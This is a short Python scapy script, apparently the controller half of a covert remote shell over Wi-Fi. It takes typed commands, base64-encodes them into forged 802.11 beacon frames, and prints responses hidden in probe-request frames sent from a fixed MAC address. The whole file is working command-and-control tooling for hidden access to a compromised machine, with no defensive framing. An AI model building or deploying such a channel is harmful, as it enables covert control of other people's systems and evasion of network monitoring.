#!/usr/bin/python

# python sender.py mon1

import logging
import base64
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

interface=sys.argv[1] #mon1
verbose=0

conf.verbose=verbose
conf.iface=interface
ssid=""

def sniffProbe(p):
	if p.haslayer(Dot11):
		if p.type == 0 and p.subtype == 4: # if management frame and probe-request
			if p.addr2 == "11:22:33:44:55:66":
				#print "wow"
				print base64.b64decode(p.info),
				return True

def SendRates(rates):
	frame = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2="11:22:33:44:55:66",addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",len=len(ssid),info=ssid)/Dot11Elt(ID="Rates",info=rates)/Dot11Elt(ID="DSset",info="\x03")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
	sendp(frame, verbose=verbose)
	sniff(iface=interface, stop_filter=sniffProbe)

cmd = ""
while cmd != "exit":
	print "\n\nshell>",
	cmd = raw_input()
	if cmd != "exit":
		SendRates(base64.b64encode(cmd))

print "\nNice meeting you. Bye!!\n"

#sendp(RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",len=len("asdhello"),info="asdhello")/Dot11Elt(ID="Rates",info="testing")/Dot11Elt(ID="DSset",info="\x03")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"))
